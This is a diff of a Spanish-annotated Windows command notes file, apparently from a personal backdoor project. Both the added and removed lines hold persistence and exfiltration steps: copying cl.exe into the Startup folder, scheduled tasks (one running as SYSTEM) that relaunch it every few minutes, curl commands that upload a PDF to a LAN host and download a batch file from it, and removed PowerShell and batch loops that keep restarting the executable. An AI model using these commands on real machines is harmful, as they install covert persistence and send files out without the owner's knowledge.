@@ -1,15 +1,15 @@
-copy cl.exe C:\Users\ezzyo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-Start-Process -FilePath C:\Users\ezzyo\Downloads\cl.exe -NoNewWindow
-curl -X POST -F "file=@avis.pdf" http://192.168.1.138:8000/upload
 
-schtasks /create /sc minute /mo 2 /tn Compilacion /tr "C:\Users\ezzyo\OneDrive\Desktop\myworkspace\backdoor\dist\client.bat"
-schtasks /create /sc once /st 20:40 /tn Compilacion /tr "C:\Users\ezzyo\OneDrive\Desktop\myworkspace\backdoor\dist\cl.exe"
+
+curl -X POST -F "file=@filename.pdf" http://192.168.1.138:8000/upload
+curl -o C:\Users\user\Downloads\hello.bat http://192.168.1.138:3030/descargar_hello_bat
+
+schtasks /create /sc minute /mo 2 /tn Compilacion /tr "ruta"
+schtasks /create /sc once /st 20:40 /tn Compilacion /tr "ruta"
 
 schtasks /create /tn Compilacion /ru SYSTEM /sc minute /mo 5 /st 20:47
 
-schtasks /create /sc minute /mo 5 /tn COMPILACION /st 21:03 /tr "C:\Users\ezzyo\Downloads\cl.exe"
+schtasks /create /sc minute /mo 5 /tn COMPILACION /st 21:03 /tr "C:\Users\user\Downloads\cl.exe"
 
-curl -o C:\Users\ezzyo\Downloads\hello.bat http://192.168.1.138:3030/descargar_hello_bat
 
 
 echo @echo off > hello.bat
@@ -19,28 +19,3 @@ echo echo Tercera línea >> hello.bat
 echo echo Cuarta línea >> hello.bat
 echo echo Quinta línea >> hello.bat
 
-
-$executablePath = "C:\Users\ezzyo\Downloads\cl.exe"
-
-while ($true) {
-    # Verifica si el proceso está en ejecución
-    $process = Get-Process | Where-Object { $_.Path -eq $executablePath }
-
-    if (-not $process) {
-        # Si el proceso no está en ejecución, inícialo
-        Start-Process -FilePath $executablePath -NoNewWindow
-    }
-
-    # Espera un tiempo antes de verificar nuevamente (por ejemplo, 1 minuto)
-    Start-Sleep -Seconds 60
-}
-
-
-echo @echo off > ejecutar_cl.bat
-echo :LOOP >> ejecutar_cl.bat
-
-echo start C:\Users\ezzyo\Downloads\cl.exe >> ejecutar_cl.bat
-
-echo timeout /t 10 /nobreak >nul >> ejecutar_cl.bat
-
-echo goto LOOP >> ejecutar_cl.bat
